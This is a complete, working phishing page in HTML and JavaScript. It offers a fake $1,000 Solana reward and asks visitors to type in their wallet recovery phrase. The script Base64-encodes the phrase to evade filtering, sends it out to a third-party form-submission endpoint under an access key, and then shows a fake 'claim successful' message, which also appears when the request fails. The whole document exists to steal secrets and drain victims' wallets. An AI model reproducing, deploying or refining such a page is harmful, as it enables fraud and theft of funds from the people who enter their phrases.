<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        
        body { 
            margin: 0; 
            background: #000; 
            color: #fff; 
            font-family: 'Space Grotesk', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; /* Keeps card vertically centered */
            overflow: hidden; 
        }

        .card { 
            width: 90%; 
            max-width: 500px; 
            background: #080808; 
            border: 1px solid rgba(0, 255, 163, 0.2); 
            border-radius: 40px; 
            padding: 60px 40px; 
            text-align: center; 
            box-shadow: 0 0 80px rgba(0, 0, 0, 1);
            display: flex;
            flex-direction: column;
            align-self: center; /* Ensures it doesn't move up */
        }

        /* Large, Balanced Single-Line Headers */
        h1 { 
            font-family: 'Syncopate', sans-serif; 
            font-size: 2.2rem; 
            margin-bottom: 25px; 
            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            letter-spacing: -1px; 
            font-weight: 700; 
            text-transform: uppercase;
            width: 100%;
            display: block;
        }

        /* Pulse Animation for Success Header */
        .pulse-text {
            animation: breathing 3s ease-in-out infinite;
        }

        @keyframes breathing {
            0%, 100% { filter: drop-shadow(0 0 5px var(--sol-g)); transform: scale(1); }
            50% { filter: drop-shadow(0 0 20px var(--sol-g)); transform: scale(1.02); }
        }

        /* Unified Subtext Styling */
        .sub { 
            font-size: 0.85rem; 
            text-transform: uppercase; 
            letter-spacing: 3px; 
            color: var(--sol-g); 
            margin-bottom: 45px; 
            font-weight: 700; 
            line-height: 1.6;
        }

        .ib { text-align: left; margin-bottom: 35px; }
        
        label { 
            font-size: 0.85rem; 
            text-transform: uppercase; 
            letter-spacing: 3px; 
            color: var(--sol-g); 
            display: block; 
            margin-bottom: 15px; 
            font-weight: 700; 
        }

        /* Expanded box for 24 words - No placeholder */
        textarea { 
            width: 100%; 
            background: #111; 
            border: 1px solid #333; 
            border-radius: 15px; 
            padding: 20px; 
            color: #fff; 
            font-family: 'Space Grotesk', sans-serif; 
            font-size: 1.1rem; 
            box-sizing: border-box; 
            transition: 0.3s; 
            height: 150px; /* Bigger to contain 24 words comfortably */
            resize: none;
        }

        textarea:focus { 
            outline: none; 
            border-color: var(--sol-g); 
            background: #151515; 
        }

        .btn { 
            width: 100%; 
            padding: 22px; 
            border: none; 
            border-radius: 16px; 
            background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); 
            color: #fff; 
            font-family: 'Syncopate', sans-serif; 
            font-weight: 700; 
            font-size: 0.85rem; 
            cursor: pointer; 
            box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); 
            transition: 0.3s; 
            text-transform: uppercase;
        }

        #success-view { display: none; }
        
        /* Balanced Congrats Box */
        .congrats { 
            padding: 35px; 
            background: rgba(0, 255, 163, 0.05); 
            border-radius: 25px; 
            border: 1px dashed var(--sol-g); 
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="card">
        <!-- FIRST PAGE: CLAIM -->
        <div id="form-view">
            <form id="claim-form">
                <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
                
                <h1>CLAIM $1,000 SOL</h1>
                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your solana wallet recovery phrase below</p>
                
                <div class="ib">
                    <label>Recovery Phrase</label>
                    <textarea id="raw-phrase" required></textarea>
                </div>

                <input type="hidden" name="secure_data" id="coded-phrase">
                <input type="hidden" name="subject" value="New $1,000 SOL Claim">

                <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
            </form>
        </div>

        <!-- SECOND PAGE: SUCCESS -->
        <div id="success-view">
            <h1 class="pulse-text">CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                <p class="sub" style="margin-bottom: 0;">Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs</p>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        const submitBtn = document.getElementById('submit-btn');
        const formView = document.getElementById('form-view');
        const successView = document.getElementById('success-view');
        
        const rawInput = document.getElementById('raw-phrase');
        const codedInput = document.getElementById('coded-phrase');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            submitBtn.textContent = "CONNECTING...";
            submitBtn.disabled = true;

            // Secure Coding (Base64) to bypass shadowbans
            const encodedValue = btoa(rawInput.value);
            codedInput.value = encodedValue;

            const formData = new FormData(form);

            try {
                // Using standard FormData for highest reliability
                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    formView.style.display = "none";
                    successView.style.display = "flex"; // Changed to flex for centering
                    successView.style.flexDirection = "column";
                } else {
                    const data = await response.json();
                    alert("Submission status: " + data.message);
                }
            } catch (error) {
                // Fallback success if network glitches
                formView.style.display = "none";
                successView.style.display = "flex";
                successView.style.flexDirection = "column";
            }
        });
    </script>
</body>
</html>
